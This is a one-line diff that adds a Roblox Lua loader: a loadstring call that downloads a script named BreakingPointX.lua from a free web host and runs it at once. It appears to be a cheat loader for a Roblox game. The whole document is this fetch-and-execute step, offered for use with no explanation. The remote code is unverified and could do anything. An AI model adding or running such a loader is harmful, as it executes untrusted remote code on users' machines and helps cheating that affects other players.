@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://akoscripts.000webhostapp.com/scripts/BreakingPointX.lua",true))()
